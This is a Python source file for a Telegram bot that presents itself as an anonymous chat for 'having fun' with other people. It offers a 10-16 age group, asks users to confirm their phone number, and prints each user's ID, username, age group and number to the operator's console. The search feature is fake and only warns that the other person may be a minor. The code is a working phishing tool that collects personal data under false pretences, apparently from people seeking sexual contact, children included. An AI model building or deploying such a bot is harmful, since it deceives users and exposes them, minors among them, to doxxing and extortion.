import telebot
import sys
from telebot import types
import telebot
import os
import requests
from telebot import types
import colorama
from colorama import init, Fore, Style, Back

init()

# Определение цветов
red = Fore.RED
cyan = Fore.CYAN
blue = Fore.BLUE
green = Fore.GREEN

yellow = Fore.YELLOW
reset = Style.RESET_ALL
bold = Style.BRIGHT

os.system('cls' if os.name == 'nt' else 'clear')
print(f'''
{bold}{red}
     _____
< validka >
 ---------
    \
     \
                                   .::!!!!!!!:.
  .!!!!!:.                        .:!!!!!!!!!!!!
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
        "*$bd$$$$      '*$$$$$$$$$$$o+#"
             """"          """""""
                                           ddrobil                           
{reset}           
                    .:anon chat:.    
           {bold}{yellow}tg{reset}:{cyan} t.me/ddrobil

      ''')
def is_valid_token(token):

    try:
        bot = telebot.TeleBot(token)
        bot_info = bot.get_me()
        if bot_info:
            return True
    except telebot.apihelper.ApiException:
        return False

token = input(f"     {blue}введите токен вашего бота >> ")

if not is_valid_token(token):
    print("{reset}     неверный токен. пожалуйста, повторите запуск скрипта")
    sys.exit

else:
    def get_bot_username(token):
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url).json()
    
    # Проверяем, что запрос успешно выполнен и содержит имя пользователя
        if response.get("ok") and 'username' in response.get("result", {}):
            return response["result"]["username"]
        else:
            return None

    username = get_bot_username(token)
    if username:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''
{bold}{red}
     _____
< validka >
 ---------
    \
     \
                                   .::!!!!!!!:.
  .!!!!!:.                        .:!!!!!!!!!!!!
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
        "*$bd$$$$      '*$$$$$$$$$$$o+#"
             """"          """""""
                                           ddrobil                           
{reset}           
                    .:anon chat:.    
           {bold}{yellow}tg{reset}:{cyan} t.me/ddrobil
                               
      ''')
        print(f"        бот запущен{reset} - {red}для выхода [ctrl + c]{reset}\n        юз вашего бота: {yellow}@{username}{reset}\n        отправьте с вашего аккаунта\n        команду {yellow}- /start{reset} боту.")      
bot = telebot.TeleBot(token)
user_data = {}
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, f"<b>Привет, {message.from_user.first_name}!</b> 🍒 Здесь ты сможешь пообщаться и развлечься с желающими этого людьми. Сначала укажите ваш возрастную группу, чтобы находить людей по вашим параметрам.", parse_mode='HTML')
    markup = types.ReplyKeyboardMarkup(row_width=3, resize_keyboard=True)
    itembtn1 = types.KeyboardButton('10-16')
    itembtn2 = types.KeyboardButton('16-18')
    itembtn3 = types.KeyboardButton('18+')
    bot.send_message(message.chat.id, "Выберите возрастную группу:", reply_markup=markup.add(itembtn1, itembtn2, itembtn3))

@bot.message_handler(func=lambda message: message.text in ['10-16', '16-18', '18+'])
def set_age(message):
    user_data[message.chat.id] = {'age': message.text}
    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    itembtn1 = types.KeyboardButton('Подтвердить номер', request_contact=True)
    bot.send_message(message.chat.id, "Подтвердите ваш номер телефона:", reply_markup=markup.add(itembtn1))

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    markup = types.ReplyKeyboardRemove()
    if message.contact.user_id == message.from_user.id:
        print(f"\n        ID Пользователя: {message.from_user.id}\n"
              f"      НикНейм: @{message.from_user.username}\n"
              f"      Возрастная группа: {user_data[message.chat.id]['age']}\n"
              f"      Номер телефона: {message.contact.phone_number}\n\n")
        bot.send_message(message.chat.id, "<b>🍒 Регистрация завершена!</b>\nДля поиска воспользуйтесь - /search", reply_markup=markup, parse_mode="HTML")
    else:
        print(f"        ID Пользователя: {message.from_user.id}\n"
              f"      НикНейм: @{message.from_user.username}\n"
              f"      Попытка подтвердить номер чужим контактом: {message.contact.phone_number}\n\n")
        bot.send_message(message.chat.id, "Вы отправили не свой номер телефона!", reply_markup=markup)

@bot.message_handler(commands=['search'])
def default_handler(message):
    bot.send_message(message.chat.id, f'''
<b>🔍 Идет ожидание онлайн пользователей...</b>


<i>🍒 - Будьте осторожны при отправке личных фото/видео материалов!

💬 - Собеседник может быть несовершенно летнего возраста
        Мы не несем ответственность за ваши действия.</i>
''', parse_mode="html")

try:
    bot.polling(none_stop=True)
except Exception as e:
    print(f"Произошла ошибка: {e}")
